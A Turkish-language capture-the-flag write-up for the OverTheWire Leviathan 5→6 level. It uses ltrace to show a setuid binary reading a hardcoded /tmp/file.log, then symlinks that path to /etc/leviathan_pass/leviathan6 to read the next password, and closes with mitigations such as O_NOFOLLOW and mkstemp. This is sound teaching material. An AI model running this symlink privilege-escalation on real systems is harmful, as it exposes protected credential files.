# Leviathan 5 → 6

> **Bağlantı:** `ssh leviathan5@leviathan.labs.overthewire.org -p 2223`
> **Hedef:** `leviathan5` programının sabit dosya yolunu symlink ile yönlendirip `leviathan6` parolasını oku.

---

## 1. Keşif (Recon)

```bash
leviathan5@gibson:~$ ls -la
-r-sr-x---  1 leviathan6 leviathan5 15148 leviathan5

leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
```

setuid `leviathan5` (sahibi leviathan6). Çalışınca `/tmp/file.log` arıyor.

## 2. Analiz — `ltrace`

```bash
leviathan5@gibson:~$ ltrace ./leviathan5
fopen("/tmp/file.log", "r")           = 0
puts("Cannot find /tmp/file.log")
exit(-1)
```

Program mantığı:
1. `fopen("/tmp/file.log", "r")` — **sabit (hardcoded)** bir yolu **leviathan6 yetkisiyle** açar,
2. dosya yoksa hata verir; varsa içeriğini basar ve (genelde) `unlink` ile siler.

## 3. Zafiyet

Program dosyayı **efektif uid leviathan6** ile açıyor ve **hangi dosya olduğunu kontrol etmiyor** — sadece `/tmp/file.log` yolunu açıyor. `fopen` symlink'leri takip eder. Yani `/tmp/file.log`'u parola dosyasına **symlink** yaparsak, program onu leviathan6 olarak okuyup bize basar.

> (Leviathan 2'den farkı: orada bir `access()` *gerçek uid* ile ön kontrol yapıyordu ve symlink'i bozuyordu. Burada hiç erişim kontrolü yok, doğrudan `fopen` → klasik symlink saldırısı çalışır.)

## 4. Sömürü (Exploit)

```bash
leviathan5@gibson:~$ rm -f /tmp/file.log
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
**********
leviathan5@gibson:~$ rm -f /tmp/file.log     # temizlik
```

Program `/tmp/file.log` → `/etc/leviathan_pass/leviathan6` symlink'ini leviathan6 olarak açıp parolayı ekrana bastı.

## 5. Çözüm Özeti

```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

→ `leviathan6` parolası: `**********`

| Adım | Bulgu |
|------|-------|
| Recon | setuid `leviathan5`, `/tmp/file.log` istiyor |
| ltrace | `fopen("/tmp/file.log","r")` (hardcoded, kontrolsüz) |
| Zafiyet | Symlink saldırısı (öngörülebilir /tmp yolu + setuid fopen) |
| Exploit | `/tmp/file.log` → parola dosyasına symlink |

**Alınan ders:** Setuid programlar `/tmp` altındaki **öngörülebilir ve symlink'lenebilir** dosyalara güvenmemeli. Saldırgan dosyayı parola gibi hedeflere yönlendirebilir (symlink/TOCTOU). Güvenli yol: `O_NOFOLLOW`, kullanıcıya özel güvenli dizin, `mkstemp`, ve yetkiyi (`setresuid`) işten önce düşürmek.
